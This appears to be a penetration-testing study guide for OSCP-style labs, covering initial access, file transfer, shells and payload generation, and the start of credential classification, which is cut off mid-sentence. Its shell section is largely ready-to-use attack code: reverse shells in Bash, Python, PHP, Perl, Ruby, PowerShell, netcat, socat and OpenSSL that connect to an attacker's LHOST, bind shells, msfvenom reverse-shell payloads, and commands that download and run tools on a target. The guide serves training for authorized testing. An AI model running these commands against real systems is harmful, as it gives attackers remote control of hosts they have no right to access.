title: 9.3.0 Stage 03: Initial Access
text: id="stage-03-initial-access">9.3.0 Stage 03: Initial Access ← Main index | Strategy map | Study methods: Turn application weaknesses into access ; Select and adapt public exploits ; Establish sessions and move files ; Move to another host Purpose: convert a validated service/application primitive into useful access or verified execution, then establish and verify the resulting session or application privilege. Task Use it to RDP access Connect to an assigned Windows host and recognize the resulting source position Web file handling Separate traversal, inclusion, upload/write and executable handling Command and SQL injection Prove OS command execution or manually exploit SQL query control Access control and XSS Validate object/role/API weaknesses and useful browser-context execution WordPress and SSRF Map WordPress capabilities/components and prove server-side fetching/internal reachability Public exploit selection and adaptation Match a PoC to exact prerequisites, audit it, repair runtime/code assumptions and independently verify its effect Exit condition: useful application privilege or operating-system execution is verified under a named identity/context. After OS access, verify host and identity, re-enumerate, and hand session reliability to Block 7; use file transfer when tools or evidence must cross hosts.

title: 9.4.1 File Transfer
text: id="file-transfer">9.4.1 File Transfer ← Reference index · Previous: RDP access | Strategy map | Study methods: Establish sessions and move files Choose: HTTP pull when the target can reach Kali; SCP when SSH credentials work; SMB for a Windows-friendly read/write share; Netcat or Base64 only when the simpler route is unavailable. <h2

title: 9.4.1.1 Linux target: pull LinPEAS from Kali over HTTP
text: id="linux-target-pull-linpeas-from-kali-over-http">9.4.1.1 Linux target: pull LinPEAS from Kali over HTTP On Kali, serve the directory containing linpeas.sh : cd /path/to/tools python3 -m http.server 8000 --bind 0.0.0.0 On the Linux target, download into a writable directory and run it: wget http://LHOST:8000/linpeas.sh -O /tmp/linpeas.sh chmod +x /tmp/linpeas.sh /tmp/linpeas.sh | tee /tmp/linpeas.txt Read: Kali should log an HTTP request and a successful response. A downloaded enumeration script is a lead generator; manually verify any escalation candidate. <summary

title: 9.4.1.1.1 HTTP variants — fixed server directory, curl, Windows and alternate built-ins
text: id="variant-9-4-1-1-1">9.4.1.1.1 HTTP variants — fixed server directory, curl, Windows and alternate built-ins <h3

title: 9.4.1.1.2 Serve a fixed directory without changing folders
text: id="serve-a-fixed-directory-without-changing-folders">9.4.1.1.2 Serve a fixed directory without changing folders python3 -m http.server 8000 --bind 0.0.0.0 --directory /path/to/tools Python's simple server supplies downloads over unencrypted HTTP. Stop it with Ctrl+C when finished. <h3

title: 9.4.1.1.3 Linux target with curl
text: id="linux-target-with-curl">9.4.1.1.3 Linux target with curl curl -fL http://LHOST:8000/FILE -o /tmp/FILE -f reports HTTP errors and -L follows redirects. Use a writable destination. <h3

title: 9.4.1.1.4 Windows target with PowerShell
text: id="windows-target-with-powershell">9.4.1.1.4 Windows target with PowerShell Run inside PowerShell: Invoke-WebRequest -Uri "http://LHOST:8000/FILE" -OutFile "C:\Windows\Temp\FILE" From cmd.exe , invoke PowerShell explicitly: powershell -NoProfile -Command "Invoke-WebRequest -Uri 'http://LHOST:8000/FILE' -OutFile 'C:\Windows\Temp\FILE'" <h3

title: 9.4.1.1.5 Windows alternatives
text: id="windows-alternatives">9.4.1.1.5 Windows alternatives (New-Object Net.WebClient).DownloadFile('http://LHOST:8000/FILE','C:\Windows\Temp\FILE') curl.exe -fL http://LHOST:8000/FILE -o C:\Windows\Temp\FILE certutil.exe -urlcache -split -f http://LHOST:8000/FILE C:\Windows\Temp\FILE Availability and policy can differ by host. certutil may leave URL-cache artifacts; remove only artifacts you created when cleanup is appropriate. <h2

title: 9.4.1.2 Verify the transfer
text: id="verify-the-transfer">9.4.1.2 Verify the transfer Compare the source and destination hashes. On Kali or Linux: sha256sum FILE sha256sum /tmp/FILE On Windows: Get-FileHash -Algorithm SHA256 "C:\Windows\Temp\FILE" Decisive output: matching SHA-256 values establish that the two saved files contain the same bytes. A successful HTTP status alone does not. <summary

title: 9.4.1.2.1 SCP — copy through an authenticated SSH service
text: id="variant-9-4-1-2-1">9.4.1.2.1 SCP — copy through an authenticated SSH service <h3

title: 9.4.1.2.2 Kali to a Linux target
text: id="kali-to-a-linux-target">9.4.1.2.2 Kali to a Linux target scp FILE USER@TARGET:/tmp/FILE <h3

title: 9.4.1.2.3 Linux target to Kali
text: id="linux-target-to-kali">9.4.1.2.3 Linux target to Kali Run from Kali when the target's SSH service is reachable: scp USER@TARGET:/path/to/FILE ./FILE <h3

title: 9.4.1.2.4 SSH key or nonstandard port
text: id="ssh-key-or-nonstandard-port">9.4.1.2.4 SSH key or nonstandard port scp -i KEY -P PORT FILE USER@TARGET:/tmp/FILE scp uses uppercase -P for the SSH port. Authentication success does not guarantee write permission at the destination path. <summary

title: 9.4.1.2.5 SMB — read and write files from Windows
text: id="variant-9-4-1-2-5">9.4.1.2.5 SMB — read and write files from Windows <h3

title: 9.4.1.2.6 Start an authenticated SMB share on Kali
text: id="start-an-authenticated-smb-share-on-kali">9.4.1.2.6 Start an authenticated SMB share on Kali mkdir -p share sudo impacket-smbserver transfer "$(pwd)/share" -smb2support -username USER -password 'PASSWORD' The first positional value is the share name; the second is its local directory. The supplied USER and PASSWORD authenticate to this temporary Kali share. Some installations expose the legacy wrapper name: sudo smbserver.py transfer "$(pwd)/share" -smb2support -username USER -password 'PASSWORD' <h3

title: 9.4.1.2.7 Connect and download from Windows
text: id="connect-and-download-from-windows">9.4.1.2.7 Connect and download from Windows net use \\LHOST\transfer /user:USER "PASSWORD" copy \\LHOST\transfer\FILE C:\Windows\Temp\FILE <h3

title: 9.4.1.2.8 Upload evidence from Windows to Kali
text: id="upload-evidence-from-windows-to-kali">9.4.1.2.8 Upload evidence from Windows to Kali copy C:\Windows\Temp\FILE \\LHOST\transfer\FILE net use \\LHOST\transfer /delete Kali must accept inbound TCP/445 and the target must permit outbound SMB. The share is read/write unless started with Impacket's -readonly option. <summary

title: 9.4.1.2.9 Netcat — stream a file when a direct TCP connection is possible
text: id="variant-9-4-1-2-9">9.4.1.2.9 Netcat — stream a file when a direct TCP connection is possible <h3

title: 9.4.1.2.10 Retrieve a file from the target to Kali
text: id="retrieve-a-file-from-the-target-to-kali">9.4.1.2.10 Retrieve a file from the target to Kali Kali receives: nc -lvnp PORT > FILE The target sends: nc -nv LHOST PORT < /path/to/FILE <h3

title: 9.4.1.2.11 Send a file from Kali to the target
text: id="send-a-file-from-kali-to-the-target">9.4.1.2.11 Send a file from Kali to the target The target receives: nc -lvnp PORT > /tmp/FILE Kali sends: nc -nv TARGET PORT < FILE If the listener rejects -p , use the OpenBSD-style form and check nc -h locally: nc -lvn PORT > FILE Netcat provides no authentication, encryption, filename metadata or integrity check. Confirm direction and compare hashes afterward. <summary

title: 9.4.1.2.12 Temporary FTP — only when an FTP client is the available route
text: id="variant-9-4-1-2-12">9.4.1.2.12 Temporary FTP — only when an FTP client is the available route On Kali, after intentionally selecting/installing pyftpdlib in an isolated environment: python3 -m pyftpdlib -p PORT On the target: ftp LHOST PORT binary get FILE put FILE quit The default temporary server can be unauthenticated and plaintext. Bind/serve only the intended directory, expose it only for the transfer, compare hashes and stop it immediately. HTTP/SCP/SMB are normally preferable. <summary

title: 9.4.1.2.13 Base64 — move a small file through a text-only channel
text: id="variant-9-4-1-2-13">9.4.1.2.13 Base64 — move a small file through a text-only channel <h3

title: 9.4.1.2.14 Encode on Linux
text: id="encode-on-linux">9.4.1.2.14 Encode on Linux base64 -w 0 FILE <h3

title: 9.4.1.2.15 Decode on Linux
text: id="decode-on-linux">9.4.1.2.15 Decode on Linux printf '%s' 'BASE64_DATA' | base64 -d > /tmp/FILE <h3

title: 9.4.1.2.16 Decode in PowerShell
text: id="decode-in-powershell">9.4.1.2.16 Decode in PowerShell [IO.File]::WriteAllBytes('C:\Windows\Temp\FILE',[Convert]::FromBase64String('BASE64_DATA')) Use this for small files. Long encoded values are easy to truncate or corrupt; compare hashes. <summary

title: 9.4.1.2.17 Failure cues — identify the broken layer
text: id="variant-9-4-1-2-17">9.4.1.2.17 Failure cues — identify the broken layer Symptom Check next Kali logs no HTTP request Confirm LHOST , target-to-Kali route, listener bind address and outbound filtering HTTP returns 404 Confirm the server directory, exact filename and case Destination reports permission denied Use a writable directory such as /tmp or the current user's Windows temp directory File downloads but does not run Verify its hash, interpreter/architecture, execute permission and line endings SCP authenticates but cannot write Change the remote destination to a directory writable by that identity SMB connection fails Check TCP/445 reachability, credentials, SMB2 support and existing Windows connections to the same server Netcat connects but the file differs Repeat with clear sender/receiver roles and compare hashes before executing <h2

title: 9.4.1.3 PHP HTTP file server when Python is unavailable
text: id="php-http-file-server-when-python-is-unavailable">9.4.1.3 PHP HTTP file server when Python is unavailable Use on the sending host when PHP CLI is present and the receiver can reach it. Serve a directory containing only the intended transfer artifacts. <h3

title: 9.4.1.3.2 Receiver: use the actual sender address and verify the received artifact
text: id="variant-9-4-1-3-2">9.4.1.3.2 Receiver: use the actual sender address and verify the received artifact # Receiver: use the actual sender address and verify the received artifact curl -f http://LHOST:8000/FILE -o FILE Read: this is a file-serving route, not an upload server or a shell. Check the HTTP status, file size/hash and target architecture before execution. If the target cannot initiate this connection, choose another transfer direction/transport rather than restarting the same server. Sources: upstream 1 .

title: 9.4.2 Shells, Payloads and Session Repair
text: id="shells-payloads-and-session-repair">9.4.2 Shells, Payloads and Session Repair ← Stage index | Public-exploit adaptation | File transfer | Payload obstacles | Shell cheatsheet | Strategy map | Study methods: Establish sessions and move files ; Resolve payload execution obstacles Goal: turn verified command execution into a session whose execution, transport and interaction properties are understood. Every command is a generic authorized-lab reference, not a target assignment. <h2

title: 9.4.2.1 Keep four states separate
text: id="keep-four-states-separate">9.4.2.1 Keep four states separate delivery → execution → connection → usable session State Decisive evidence Does not yet prove Delivery Exact bytes/request reached intended consumer Payload executed Execution Harmless command output or controlled side effect Network callback works Connection Listener records the expected peer Commands and I/O are usable Session Commands return and host/identity are verified Higher privilege or stability Do not change all four layers at once. Preserve the last confirmed state and test the next boundary. <h2

title: 9.4.2.2 Choose the access form
text: id="choose-the-access-form">9.4.2.2 Choose the access form Situation Prefer Main prerequisite / limitation One bounded action is enough Direct command execution Observable output or side effect; no shell required Valid credential and remote service SSH, WinRM or RDP Authentication plus remote-logon authorization Target can reach Kali Reverse shell Target egress and a reachable Kali listener Kali can reach a target listener Bind shell Target can bind and inbound path permits it Payload is staged or protocol-aware Matching framework handler Handler must use the exact payload/transport Prefer authenticated administrative access when it is already available: it is normally more stable, auditable and feature-complete than an improvised shell. <h2

title: 9.4.2.3 Map the callback before generating anything
text: id="map-the-callback-before-generating-anything">9.4.2.3 Map the callback before generating anything trigger context → target process/interpreter and architecture → target source interface → route/egress controls → LHOST address visible from target → LPORT → local bind interface → listener/handler Select LHOST from the target's point of view. A VPN address, tunnel endpoint or reachable interface may be correct while Kali's default-route address is wrong. On Kali: ip -brief address ip route ss -lntp Windows source/listener checks: Get-NetIPAddress -AddressFamily IPv4 Get-NetRoute -AddressFamily IPv4 Get-NetTCPConnection -State Listen <h2

title: 9.4.2.4 Listener baselines and Netcat variants
text: id="listener-baselines-and-netcat-variants">9.4.2.4 Listener baselines and Netcat variants Traditional/OpenBSD-style nc commonly used on Kali: rlwrap nc -lvnp LPORT Nmap Ncat uses a positional listen port; do not mechanically copy every nc flag: ncat -4 -lvn 0.0.0.0 LPORT Verify the bind in another terminal: ss -lntp | grep ':LPORT' If multiple interfaces exist, bind deliberately: ncat -4 -lvn LHOST LPORT Failure cue: a listener bound only to 127.0.0.1 , the wrong VPN/interface address or the wrong address family cannot receive the expected callback. “Address already in use” means another process owns the bind. <h2

title: 9.4.2.5 Prove command execution before requesting a shell
text: id="prove-command-execution-before-requesting-a-shell">9.4.2.5 Prove command execution before requesting a shell Linux: id; hostname; pwd Windows: whoami & hostname & cd For blind execution, use one bounded callback or file side effect that the current context can produce and you can independently observe. Do not interpret a hung HTTP request as proof of a shell; the server may simply be waiting on a child process or timeout. <h2

title: 9.4.2.6 Linux reverse-shell baselines
text: id="linux-reverse-shell-baselines">9.4.2.6 Linux reverse-shell baselines Choose an interpreter that you confirmed exists. Bash TCP: bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1' Python 3 with a PTY: python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("LHOST",LPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")' Portable FIFO plus Netcat when -e is absent: rm -f /tmp/f; mkfifo /tmp/f cat /tmp/f | /bin/sh -i 2>&1 | nc LHOST LPORT >/tmp/f PHP CLI: php -r '$s=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");' <summary

title: 9.4.2.6.1 Variant — target has Ncat command execution
text: id="variant-9-4-2-6-1">9.4.2.6.1 Variant — target has Ncat command execution Linux: ncat LHOST LPORT --exec /bin/sh Windows: ncat.exe LHOST LPORT --exec cmd.exe --exec exposes the named program directly to the network connection. Use only on the assigned host and remove transferred tooling when the exercise requires cleanup. Shell-language cue: a command injection may execute through /bin/sh , which does not understand every Bash construct. Wrap Bash-specific syntax in bash -c '...' and then encode it for the outer HTTP/template/database layer. <h2

title: 9.4.2.7 Windows session options
text: id="windows-session-options">9.4.2.7 Windows session options Prefer an available authenticated service: evil-winrm -i TARGET -u USER -p 'PASSWORD' xfreerdp /v:TARGET /u:'DOMAIN\USER' /p:'PASSWORD' /cert:ignore ssh -p PORT USER@TARGET PowerShell TCP shell when direct command execution is the only primitive: $client = [Net.Sockets.TcpClient]::new('LHOST',LPORT) $stream = $client.GetStream() $buffer = New-Object byte[] 65535 while (($count = $stream.Read($buffer,0,$buffer.Length)) -gt 0) { $command = [Text.Encoding]::ASCII.GetString($buffer,0,$count) $output = (Invoke-Expression $command 2>&1 | Out-String) + "PS $((Get-Location).Path)> " $bytes = [Text.Encoding]::ASCII.GetBytes($output) $stream.Write($bytes,0,$bytes.Length) $stream.Flush() } $client.Close() This is a basic command channel, not a ConPTY. Host policy, language mode, AMSI/antimalware, quoting and the parent process can affect it. PowerShell -EncodedCommand solves nested quoting; it is not encryption or an AV bypass. Generate UTF-16LE Base64 locally: $command = 'COMMAND' $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command)) $encoded Invoke in the target command context: powershell.exe -NoProfile -NonInteractive -EncodedCommand BASE64_UTF16LE <h2

title: 9.4.2.8 Bind shells
text: id="bind-shells">9.4.2.8 Bind shells Use a bind shell only when Kali can reach a target listener and reverse egress is unavailable. Traditional Netcat with -e support on a Linux target: nc -lvnp PORT -e /bin/sh Connect from Kali: nc -nv TARGET PORT FIFO alternative when -e is absent: rm -f /tmp/f; mkfifo /tmp/f cat /tmp/f | /bin/sh -i 2>&1 | nc -lvnp PORT >/tmp/f Ncat target listener: ncat -4 -lvn 0.0.0.0 PORT --exec /bin/sh Bind shells expose a target port and may be blocked by the host firewall or upstream ACL. A successful local bind does not prove Kali can reach it. <h2

title: 9.4.2.9 Generate payloads after selecting context
text: id="generate-payloads-after-selecting-context">9.4.2.9 Generate payloads after selecting context List rather than guess names and formats: msfvenom -l payloads | grep -E 'linux|windows' | grep -E 'x64|x86' msfvenom --list formats msfvenom -p PAYLOAD_NAME --list-options Stageless command-shell binaries: msfvenom -p linux/x64/shell_reverse_tcp \ LHOST=LHOST LPORT=LPORT \ -f elf -o shell.elf msfvenom -p windows/x64/shell_reverse_tcp \ LHOST=LHOST LPORT=LPORT \ -f exe -o shell.exe Verify the resulting artifacts: file shell.elf shell.exe sha256sum shell.elf shell.exe msfvenom does not make a payload compatible with the delivery path. Match target OS, process architecture, payload type, output format, available execution method and callback route. <h3

title: 9.4.2.9.1 Staged versus stageless
text: id="staged-versus-stageless">9.4.2.9.1 Staged versus stageless stageless: complete payload delivered at once; larger, usually simpler and more stable staged: small first stage connects and retrieves the rest; smaller initial footprint, needs matching handler and second transfer Metasploit naming commonly reflects the distinction: windows/x64/shell_reverse_tcp stageless windows/x64/shell/reverse_tcp staged A raw Netcat listener can receive many ordinary stageless command shells. A staged payload normally needs multi/handler configured with the exact same payload: msfconsole -q use exploit/multi/handler set payload PAYLOAD_NAME set LHOST LHOST set LPORT LPORT show options run A connection to Netcat with no usable commands can mean a staged payload reached a non-staging listener. It is not necessarily failed code execution. <h3

title: 9.4.2.9.2 Existing-PoC payload constraints
text: id="existing-poc-payload-constraints">9.4.2.9.2 Existing-PoC payload constraints Only when an existing reviewed PoC documents payload space and bad characters: msfvenom -p PAYLOAD_NAME \ LHOST=LHOST LPORT=LPORT \ -f FORMAT -v VARIABLE \ -b 'BAD_CHARACTERS' \ -s MAX_SPACE Encoders and repeated encoding do not guarantee antimalware evasion. -b is for bytes that the vulnerable input path cannot preserve; do not invent a universal bad-character list. <h2

title: 9.4.2.10 Diagnose quoting and encoding by layer
text: id="diagnose-quoting-and-encoding-by-layer">9.4.2.10 Diagnose quoting and encoding by layer Write the parser chain explicitly: HTTP/SQL/template parser → application language → command launcher (`system`, `cmd /c`, `/bin/sh -c`, PowerShell) → target shell/interpreter → payload command Test each layer with a small command. Encode only for the layer that consumes the characters: python3 -c 'import urllib.parse; print(urllib.parse.quote("COMMAND"))' Typical failures: & , | , > , < , $ , backticks, quotes or spaces consumed by an outer shell; URL decoding occurs zero, one or two times; JSON, XML, SQL or template quoting changes the command; PowerShell receives UTF-8 Base64 instead of required UTF-16LE; payload length exceeds a field, command line or exploit buffer; 32-bit payload is injected into a 64-bit context or the reverse. <h2

title: 9.4.2.11 Diagnose a missing callback in order
text: id="diagnose-a-missing-callback-in-order">9.4.2.11 Diagnose a missing callback in order Delivery: prove the request/file/argument reaches the intended consumer. Execution: prove id / whoami , hostname or a bounded side effect in the exact context. Parser: verify quoting, encoding, interpreter, working directory and length. Payload: confirm OS, architecture, format, staged/stageless type and dependencies. Listener: start it first and verify the bound address and port. Route: test target-to-listener reachability from the execution context. Security control: use concrete errors, quarantine, logs or process behavior. Session: repair TTY, buffering, encoding and job control after connection. Target-side route checks where available: nc -vz LHOST LPORT curl -v --connect-timeout 5 http://LHOST:LPORT/ Test-NetConnection LHOST -Port LPORT -InformationLevel Detailed Observe Kali while triggering: sudo tcpdump -ni any tcp port LPORT Interpretation: Observation Next decision No SYN reaches Kali Wrong execution, LHOST, route, egress or earlier parser layer SYN arrives; no listener response Wrong bind/interface/port or local firewall TCP handshake then immediate close Payload/handler mismatch, crash or security control Connection stays but no commands Staged/raw mismatch, buffering or I/O/session issue <h2

title: 9.4.2.12 Handle security-control evidence proportionately
text: id="handle-security-control-evidence-proportionately">9.4.2.12 Handle security-control evidence proportionately Windows Defender status, when the current identity can query it: Get-MpComputerStatus | Select-Object AntivirusEnabled,RealTimeProtectionEnabled,BehaviorMonitorEnabled,IoavProtectionEnabled Do not label every failure “AV.” Differentiate: file never arrived or hashes differ; file arrived and disappeared/quarantined; process creation was denied; script content was blocked; process started and exited/crashed; callback was blocked after execution; application-control or language-mode restrictions; ordinary format, architecture, permission or dependency errors. Prefer an already available native or authenticated route when it satisfies the objective. Encoding is transport representation, not proof of evasion. Custom shellcode development and deep AV-bypass work are outside this unit. For MOTW/Office/Library-file delivery, execution-policy precedence, AMSI/AppLocker/Defender evidence and restricted Metasploit module/session handling, continue with payload execution obstacles . <h2

title: 9.4.2.13 Stabilize a Linux TTY
text: id="stabilize-a-linux-tty">9.4.2.13 Stabilize a Linux TTY First obtain a PTY with an available interpreter: python3 -c 'import pty; pty.spawn("/bin/bash")' Press Ctrl-Z locally, then: stty raw -echo; fg Back in the remote shell: reset export TERM=xterm-256color stty rows 40 columns 120 If the local terminal becomes unreadable, restore it from a separate/local shell: stty sane Socat can provide a stronger PTY when present on both sides: <h3

title: 9.4.2.13.1 Kali
text: id="variant-9-4-2-13-1">9.4.2.13.1 Kali # Kali socat file:$(tty),raw,echo=0 tcp-listen:LPORT,reuseaddr <h3

title: 9.4.2.13.2 Target
text: id="variant-9-4-2-13-2">9.4.2.13.2 Target # Target socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:LHOST:LPORT TTY repair changes terminal behavior, not privilege or network reliability. A PTY may enable job control and programs that require a terminal; it does not turn a fragile route into a stable one. <h2

title: 9.4.2.14 Verify every new session
text: id="verify-every-new-session">9.4.2.14 Verify every new session Linux: hostname; id; pwd ip addr; ip route ss -lntup Windows: hostname whoami /all cd ipconfig /all route print netstat -ano Record the destination host, actual identity, privilege, current directory, interfaces/routes, parent/execution context and the exact command that produced the session. Then re-enumerate from the new state. <h2

title: 9.4.2.15 Failure router
text: id="failure-router">9.4.2.15 Failure router Symptom Interpretation / next action Direct command fails Repair exploit/request/parser before payload work Direct command succeeds, no SYN Correct payload, LHOST, interpreter or egress Listener absent/wrong bind Bind before trigger and verify with ss Connection to raw listener, no I/O Check staged payload or buffering Immediate disconnect Check process crash, handler/payload match and exit behavior Shell lacks job control Spawn PTY and repair local terminal state Arrow keys/control characters break Correct PTY, raw mode and TERM Windows shell output is garbled Check code page/encoding and payload channel File vanishes after transfer Gather quarantine/security-control evidence Works once, not again Check single-use listener, service crash, cleanup and trigger state <h2

title: 9.4.2.16 Exam boundary
text: id="exam-boundary">9.4.2.16 Exam boundary The current OSCP+ guide permits msfvenom and exploit/multi/handler against all targets, but Meterpreter and Metasploit Auxiliary/Exploit/Post modules become locked to one selected target. Metasploit pivoting is prohibited. AI chatbots are prohibited during the actual exam. Recheck the current guide before a mock or exam. <h2

title: 9.4.2.17 Powercat — Windows PowerShell shell transport
text: id="powercat--windows-powershell-shell-transport">9.4.2.17 Powercat — Windows PowerShell shell transport Use when a reviewed powercat.ps1 is available and the current PowerShell context permits it. Keep the listener and target connection direction explicit. # Attacker: listener nc -lvnp LPORT # Target: load the local reviewed script and connect back . .\powercat.ps1 powercat -c LHOST -p LPORT -e cmd.exe Read: a connection is not yet an identity proof; run hostname/whoami in the resulting channel. Script-policy/AV/runtime failures → use the existing native transfer and shell alternatives. Powercat does not repair a missing callback route. Sources: upstream 1 . <h2

title: 9.4.2.18 Penelope or pwncat-cs — handle an existing shell and move files
text: id="penelope-or-pwncat-cs--handle-an-existing-shell-and-move-files">9.4.2.18 Penelope or pwncat-cs — handle an existing shell and move files Choose one handler when its basic session/transfer features fit your platform. pwncat-cs assumes Linux unless configured otherwise; these are not interchangeable names for every similarly named pwncat project. <h3

title: 9.4.2.18.1 Basic reverse-shell listener with pwncat-cs
text: id="variant-9-4-2-18-1">9.4.2.18.1 Basic reverse-shell listener with pwncat-cs # Basic reverse-shell listener with pwncat-cs pwncat-cs -lp LPORT <h3

title: 9.4.2.18.2 Alternative: open Penelope's current CLI help, then select its listener port
text: id="variant-9-4-2-18-2">9.4.2.18.2 Alternative: open Penelope's current CLI help, then select its listener port # Alternative: open Penelope's current CLI help, then select its listener port penelope --help penelope -p LPORT In pwncat-cs's local prompt, use only the operation needed: download /REMOTE/FILE ./LOCAL_FILE upload ./LOCAL_FILE /REMOTE/FILE back For Penelope, F12 detaches a PTY session to its menu; interact SESSION_ID returns to it. Verify uploaded bytes and the target identity after reconnecting. Optional modules can fetch/run additional tools or exploitation features; they are separate actions and are not part of this basic handler workflow. Sources: upstream 1 · upstream 2 . <h2

title: 9.4.2.19 Keep listeners and long-running checks in tmux
text: id="keep-listeners-and-long-running-checks-in-tmux">9.4.2.19 Keep listeners and long-running checks in tmux Use on your own attack workstation to retain a working listener or pspy view while switching terminals. A tmux pane is not a second target shell unless you create/connect one. <h3

title: 9.4.2.19.1 tmux new-session -s oscp
text: id="variant-9-4-2-19-1">9.4.2.19.1 tmux new-session -s oscp tmux new-session -s oscp tmux list-sessions tmux attach-session -t oscp <h3

title: 9.4.2.19.2 Capture existing pane history from another terminal; not a full session recorder
text: id="variant-9-4-2-19-2">9.4.2.19.2 Capture existing pane history from another terminal; not a full session recorder # Capture existing pane history from another terminal; not a full session recorder tmux capture-pane -p -S - -t oscp:0.0 > pane-history.txt Within tmux: Ctrl-b then d detaches; Ctrl-b then c creates a window; Ctrl-b then w selects one. Read: scrollback capture only contains retained history. Continue saving raw scanner/tool output and proof explicitly rather than relying on terminal history alone. Sources: upstream 1 . <h2

title: 9.4.2.20 ASPX handler check before generating a Windows payload
text: id="aspx-handler-check-before-generating-a-windows-payload">9.4.2.20 ASPX handler check before generating a Windows payload Use only when you can place a file at a path served by an ASP.NET handler. A static upload on IIS, classic ASP, PHP or ASP.NET Core does not automatically execute ASPX pages. <%@ Page Language="C#" %> <% Response.Write(System.Security.Principal.WindowsIdentity.GetCurrent().Name); %> Save as a uniquely named test ASPX file, upload through the verified write primitive, then request its actual stored URL: curl -i http://TARGET:PORT/ACTUAL_PATH/probe.aspx Read: the process identity, rather than literal source or a file download, verifies server-side handling. Then use the matching ASPX/Windows payload generation already covered here, with the correct runtime/architecture and return route. Delete the test artifact after validation. Sources: upstream 1 . <h2

title: 9.4.2.21 Shell alternatives when the installed runtime changes
text: id="shell-alternatives-when-the-installed-runtime-changes">9.4.2.21 Shell alternatives when the installed runtime changes Choose one matching the actual target runtime and a reachable listener. These alternatives retain the current execution identity; they do not create privilege by themselves. <h3

title: 9.4.2.21.1 Attacker
text: id="variant-9-4-2-21-1">9.4.2.21.1 Attacker # Attacker nc -lvnp LPORT <h3

title: 9.4.2.21.2 Target: BusyBox build with the optional nc -e feature
text: id="variant-9-4-2-21-2">9.4.2.21.2 Target: BusyBox build with the optional nc -e feature # Target: BusyBox build with the optional nc -e feature busybox nc -e /bin/sh LHOST LPORT <h3

title: 9.4.2.21.3 Target: Perl with Socket support
text: id="variant-9-4-2-21-3">9.4.2.21.3 Target: Perl with Socket support # Target: Perl with Socket support perl -e 'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"<&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");' <h3

title: 9.4.2.21.4 Target: Ruby with its socket library
text: id="variant-9-4-2-21-4">9.4.2.21.4 Target: Ruby with its socket library # Target: Ruby with its socket library ruby -rsocket -e 's=TCPSocket.new("LHOST",LPORT);exec("/bin/sh","-i",in:s,out:s,err:s)' Read: check hostname/id after connecting, then use the existing PTY stabilization steps. Missing runtime, unsupported BusyBox options or a blocked return path → choose a supported transport instead of repeatedly changing the shell command. A noninteractive process can execute correctly while lacking a terminal. Sources: upstream 1 · upstream 2 · upstream 3 . <h2

title: 9.4.2.22 OpenSSL transport when a TLS callback is useful
text: id="openssl-transport-when-a-tls-callback-is-useful">9.4.2.22 OpenSSL transport when a TLS callback is useful Use when OpenSSL exists on both ends and the actual route permits the chosen listener. TLS is a transport choice, not a fix for an unreachable destination. <h3

title: 9.4.2.22.1 Attacker: create a short-lived local test certificate, then listen
text: id="variant-9-4-2-22-1">9.4.2.22.1 Attacker: create a short-lived local test certificate, then listen # Attacker: create a short-lived local test certificate, then listen openssl req -x509 -newkey rsa:2048 -nodes -days 1 \ -subj '/CN=listener' -keyout listener.key -out listener.crt openssl s_server -quiet -accept LPORT -cert listener.crt -key listener.key <h3

title: 9.4.2.22.2 Target: connect a shell through the FIFO and TLS client
text: id="variant-9-4-2-22-2">9.4.2.22.2 Target: connect a shell through the FIFO and TLS client # Target: connect a shell through the FIFO and TLS client mkfifo /tmp/shell-pipe /bin/sh -i < /tmp/shell-pipe 2>&1 | \ openssl s_client -quiet -connect LHOST:LPORT > /tmp/shell-pipe Read: verify the session identity and preserve the working channel. This example does not authenticate the listener certificate. A TLS handshake failure, a refused socket and a missing shell are different failures. Use a unique writable FIFO path and remove the test pipe after the session. Sources: upstream 1 · upstream 2 . <h2

title: 9.4.2.23 Sources
text: id="sources">9.4.2.23 Sources Supplied PEN-200 pp257-259, Ch 13-14 pp375-415, Ch 15 pp416-441 selectively, Ch 19 PTY examples and Ch 21.2 pp671-683 Current OSCP+ Body of Knowledge Current OSCP+ exam guide Metasploit msfvenom documentation Ncat basic usage and command execution PowerShell command-line documentation Microsoft Defender Get-MpComputerStatus getSH Useful Stuff and Tool Cheatsheet , source snapshot e1f62dd

title: 9.4.3 Credential Classification, Cracking and Reuse
text: id="credential-classification-cracking-and-reuse">9.4.3 Credential Classification, Cracking and Reuse ← Stage index | Credential cheatsheet | AD procedures | Strategy map | Study methods: Recover and use authentication material ; Gain a more useful domain identity Purpose: distinguish authentication material, estimate whether offline recovery is worthwhile, and test only compatible, evidence-backed uses. Actual credentials belong in private records. <h2

title: 9.4.3.1 Credential record
text: id="credential-record">9.4.3.1 Credential record SOURCE -> MATERIAL/FORMAT -> LOCAL/DOMAIN/APPLICATION IDENTITY -> POSSIBLE USE -> SERVICE/PROTOCOL -> AUTHENTICATION -> AUTHORIZATION -> NEW ACCESS -> RE-ENUMERATION Record source, claimed identity, format evidence, possible uses, tested service, result and resulting rights together. <h2

title: 9.4.3.2 Classify before acting
text: id="classify-before-acting">9.4.3.2 Classify before acting Material Recognition Compatible use Cleartext password Text tied to an identity/source Normal protocol/application login SSH private key OpenSSH/PEM private-key block SSH public-key authentication; recover passphrase offline if protected Linux password record USER:$id$salt$digest:... Offline recovery with complete record/format Application/file verifier Tool-specific $...$ or documented digest Offline recovery with matching mode/parser NT hash Usually 32 hex from SAM/LSASS/NTDS context Offline recovery; PtH where NTLM and the client support it Net-NTLMv2 response USER::DOMAIN:challenge:proof:blob Offline recovery or live relay under specific conditions; not PtH material DCC2/MSCache v2 Username-dependent cached-domain verifier Offline recovery; not ordinary PtH material Kerberos ticket .kirbi , ccache or in-memory cache Ticket-specific access subject to realm, SPN , validity, clock and route Kerberos roast material $krb5asrep$... or $krb5tgs$... Offline recovery with matching enctype/mode Session/API token Cookie, bearer/JWT or application token Issuing application and authorization context only Do not feed unknown strings into random modes. Preserve the source and identity context, then identify the format: hashid HASH_OR_FILE john --list=formats | grep -i KEYWORD hashcat -hh | grep -i KEYWORD hashcat --example-hashes | less Failure cue: No hashes loaded , token/line-length errors or zero parsed hashes normally indicate wrong format, mode, damaged input or unsupported version—not a 